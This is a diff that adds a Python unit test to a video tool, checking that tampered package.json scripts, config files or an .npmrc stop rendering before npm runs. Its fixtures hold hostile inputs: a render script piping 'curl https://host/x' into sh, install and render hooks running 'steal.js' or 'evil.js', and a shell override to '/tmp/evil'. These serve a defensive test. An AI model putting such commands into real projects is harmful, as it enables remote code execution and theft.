@@ -18,6 +18,7 @@ import sys
 import tempfile
 import unicodedata
 import unittest
+import unittest.mock
 from html.parser import HTMLParser
 from pathlib import Path
 
@@ -1159,6 +1160,79 @@ class ReviewFindings(unittest.TestCase):
         status, output = run_gate(digest, doc, html)
         self.assertEqual(status, 1)
         self.assertIn("U+03B1 GREEK SMALL LETTER ALPHA", output)
+
+    def test_render_runs_only_the_package_scripts_scaffold_wrote(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            project = Path(tmp) / "p"
+            project.mkdir()
+            write_source(project)
+            package = {"name": "p", "private": True, "type": "module", "scripts": make_video.expected_scripts()}
+            (project / "package.json").write_text(json.dumps(package, indent=2), encoding="utf-8")
+            (project / "hyperframes.json").write_text(json.dumps({"paths": {"assets": "assets"}}), encoding="utf-8")
+            record_path = project / "source" / "provenance.json"
+            record = json.loads(record_path.read_text(encoding="utf-8"))
+            record["scaffold_files"] = {name: make_video.file_sha256(project / name) for name in make_video.SCAFFOLD_FILES}
+            record_path.write_text(json.dumps(record), encoding="utf-8")
+            make_video.require_scaffold_files(project)                                          # as scaffold left it: fine
+            self.assertTrue(all(len(h) == 64 for h in record["scaffold_files"].values()))
+
+            def stops(what, change):
+                saved = {path: path.read_bytes() for path in (project / "package.json", project / "hyperframes.json", record_path)}
+                change()
+                errors = io.StringIO()
+                with contextlib.redirect_stderr(errors), self.assertRaises(SystemExit, msg=what):
+                    make_video.require_scaffold_files(project)
+                self.assertIn("scaffold the project again", errors.getvalue(), what)
+                (project / ".npmrc").unlink(missing_ok=True)
+                for path, data in saved.items():
+                    path.write_bytes(data)
+
+            def edit(**changes):
+                def apply():
+                    changed = json.loads((project / "package.json").read_text(encoding="utf-8"))
+                    for key, value in changes.items():
+                        if key.startswith("scripts."):
+                            changed["scripts"][key.split(".", 1)[1]] = value
+                        elif value is None:
+                            changed.pop(key, None)
+                        else:
+                            changed[key] = value
+                    (project / "package.json").write_text(json.dumps(changed), encoding="utf-8")
+                return apply
+
+            pinned = make_video.expected_scripts()["render"]
+            stops("a render script that runs another command", edit(**{"scripts.render": pinned + " && curl https://host/x | sh"}))
+            stops("a render script that renders something else", edit(**{"scripts.render": "node my-render.js"}))
+            stops("an unpinned version", edit(**{"scripts.check": "npx --yes hyperframes@latest check"}))
+            stops("another version", edit(**{"scripts.render": pinned.replace(make_video.HYPERFRAMES_VERSION, "0.0.1")}))
+            for hook in ("prerender", "postrender", "precheck", "postcheck", "prepare", "preinstall"):
+                stops(f"a {hook} hook", edit(**{f"scripts.{hook}": "node steal.js"}))
+            stops("another key", edit(dependencies={"hyperframes": "latest"}))
+            stops("a config key", edit(config={"x": 1}))
+            stops("a missing script", lambda: (project / "package.json").write_text(
+                json.dumps({**package, "scripts": {k: v for k, v in package["scripts"].items() if k != "check"}}), encoding="utf-8"))
+            stops("no package.json", lambda: (project / "package.json").unlink())
+            stops("a package.json that is not json", lambda: (project / "package.json").write_text("{", encoding="utf-8"))
+            stops("hyperframes.json changed", lambda: (project / "hyperframes.json").write_text(json.dumps({"paths": {"assets": "../elsewhere"}}), encoding="utf-8"))
+            stops("hyperframes.json gone", lambda: (project / "hyperframes.json").unlink())
+            stops("no record of the files", lambda: record_path.write_text(json.dumps({k: v for k, v in record.items() if k != "scaffold_files"}), encoding="utf-8"))
+            stops("a .npmrc", lambda: (project / ".npmrc").write_text("script-shell=/tmp/evil\n", encoding="utf-8"))
+            make_video.require_scaffold_files(project)                                          # everything put back: fine
+
+            # and cmd_render does not hand the project to revoice.py (npm) before this check passes
+            plan = planlib.build_plan(planlib.load_digest(project / "source" / "draft-vi.json"))
+            doc = make_video.voiceover_doc(plan, planlib.timeline(plan, estimated_durations(plan)))
+            (project / "voiceover.json").write_text(json.dumps(doc), encoding="utf-8")
+            (project / "package.json").write_text(json.dumps({**package, "scripts": {**package["scripts"], "render": "node evil.js"}}), encoding="utf-8")
+            ran = []
+            args = type("Args", (), {"project": str(project), "videos_dir": tmp, "asr_python": None})()
+            with unittest.mock.patch.object(make_video, "require_gate", lambda p: ""), \
+                 unittest.mock.patch.object(make_video, "require_generated_page", lambda p: None), \
+                 unittest.mock.patch.object(make_video, "require_generated_timing", lambda p: None), \
+                 unittest.mock.patch.object(make_video, "run", lambda *a, **k: ran.append(a)), \
+                 contextlib.redirect_stderr(io.StringIO()), self.assertRaises(SystemExit):
+                make_video.cmd_render(args, project)
+            self.assertEqual(ran, [], "npm was run")
 
     def test_a_unit_too_many_is_another_value(self):
         for text, value in (("19$$", "$$19"), ("$19$", "$$19"), ("$$19", "$$19"), ("19%%", "19%%"), ("19% phần trăm", "19%%"), ("$19%%", "$19%%"),
